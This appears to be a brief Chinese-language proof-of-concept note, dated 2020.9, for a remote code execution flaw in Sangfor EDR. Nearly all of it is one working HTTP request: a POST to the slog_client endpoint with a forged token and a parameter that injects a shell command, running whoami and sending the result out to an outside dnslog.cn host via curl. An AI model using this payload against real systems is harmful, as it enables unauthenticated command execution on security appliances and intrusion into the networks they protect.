# 深信服EDR RCE漏洞

> 2020.9

## #Poc

```http
POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
Host: x.x.x.x
Connection: close
Content-Length:65

{"params": "w=123\"'1234123'\"|curl `whoami`.dnslog.cn"}
```

![img](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxxvwdahcj30u00asgne.jpg)

